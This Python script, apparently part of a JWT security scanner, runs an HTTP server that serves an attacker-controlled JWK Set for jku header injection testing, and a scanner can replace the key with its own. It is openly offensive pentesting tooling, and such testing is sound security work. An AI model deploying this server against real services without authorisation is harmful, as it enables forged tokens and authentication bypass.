"""
Simple HTTP server to serve a malicious JWK Set for jku injection testing.
Usage: python3 malicious_jwk_server.py [--port PORT]
"""

import json
import argparse
from http.server import HTTPServer, BaseHTTPRequestHandler

# Default JWK Set (will be updated by scanner when needed)
# The scanner will replace this with its own generated public key
JWKS_DATA = {
    "keys": [
        {
            "kty": "RSA",
            "kid": "malicious-key-001",
            "use": "sig",
            "alg": "RS256",
            "n": "placeholder_n_value",
            "e": "AQAB"
        }
    ]
}

class JWKHandler(BaseHTTPRequestHandler):
    """HTTP request handler that serves a malicious JWK Set,
    generating or updating JWK keys and logging the 'kid'."""
    
    def log_message(self, format, *args):
        # Optional: suppress default logging or add custom
        print(f"[{self.address_string()}] {format % args}")

    def do_GET(self):
        if self.path == '/.well-known/jwks.json':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(JWKS_DATA).encode())
            print("  ✓ Served JWK Set")
        else:
            self.send_response(404)
            self.end_headers()
            print(f"  ✗ 404 Not found: {self.path}")

    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()

def update_jwks(jwk_dict):
    """Allow the scanner to update the JWK Set with its own public key."""
    global JWKS_DATA
    JWKS_DATA = {"keys": [jwk_dict]}
    print(f"[*] JWK Set updated with kid: {jwk_dict.get('kid', 'unknown')}")

def run_server(port=9000):
    """Starts an HTTP server on the specified port using JWKHandler to
    serve malicious JWK Set requests."""
    server_address = ('0.0.0.0', port)
    httpd = HTTPServer(server_address, JWKHandler)
    print(f"""
╔══════════════════════════════════════════════════════════╗
║     Malicious JWK Server for jku Injection Testing      ║
╠══════════════════════════════════════════════════════════╣
║  Server running on: http://localhost:{port}             ║
║  JWKS endpoint: http://localhost:{port}/.well-known/jwks.json ║
╠══════════════════════════════════════════════════════════╣
║  Ready to serve malicious keys.                         ║
║  Press Ctrl+C to stop                                    ║
╚══════════════════════════════════════════════════════════╝
    """)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Shutting down server...")
        httpd.shutdown()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--port', type=int, default=9000)
    args = parser.parse_args()
    run_server(port=args.port)
